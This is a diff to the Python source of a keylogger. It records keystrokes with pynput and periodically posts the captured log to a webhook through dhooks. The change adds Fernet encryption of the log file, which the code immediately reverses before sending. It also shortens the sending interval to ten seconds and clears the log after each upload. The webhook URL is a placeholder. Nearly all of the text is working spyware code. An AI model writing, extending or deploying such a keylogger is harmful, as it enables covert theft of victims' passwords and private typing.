@@ -1,8 +1,35 @@
 from pynput.keyboard import Key, Listener
+from cryptography.fernet import Fernet
 from dhooks import Webhook
 from threading import Timer
 import logging
 import os
+
+#generate fernet key
+key = Fernet.generate_key()
+
+with open("mykey.key", "wb") as mykey:
+    mykey.write(key)
+
+def encryptor():
+    f = Fernet(key)
+
+    with open("log.txt", "rb") as original_file:
+        original = original_file.read()
+
+    encrypted = f.encrypt(original)
+
+    with open("log.txt", "wb") as encrypted_file:
+        encrypted = encrypted_file.write(encrypted)
+
+    with open("log.txt", "rb") as encrypted_file:
+        encrypted = encrypted_file.read()
+
+    decrypted = f.decrypt(encrypted).decode("utf-8")
+    
+    print(decrypted)
+
+    return decrypted
 
 # variables to check the key presses
 log_dir = ""
@@ -10,8 +37,8 @@ char_count = 0
 keys = []
 
 # constants for the periodic log sending and webhook url
-WEBHOOK_URL = "insert webhook url here ahahahahaha"
-TIME_INTERVAL = 60
+WEBHOOK_URL = "token here hahaa"
+TIME_INTERVAL = 10
 
 # inputting the webhook url
 log_send = Webhook(WEBHOOK_URL)
@@ -68,9 +95,13 @@ def report():
         open("log.txt", "w").close()  # Create an empty log.txt file if it doesn't exist
 
     if os.path.getsize("log.txt") != 0:
-        with open("log.txt", "r") as file:
-            keylogs = file.read()
-        log_send.send(str(keylogs))
+        decrypted = encryptor()
+        # with open("log.txt", "r") as file:
+        #     keylogs = file.read()
+        log_send.send(str(decrypted))
+    
+    open("log.txt", "w").close()
+
     Timer(TIME_INTERVAL, lambda: report()).start()
 
 def run():
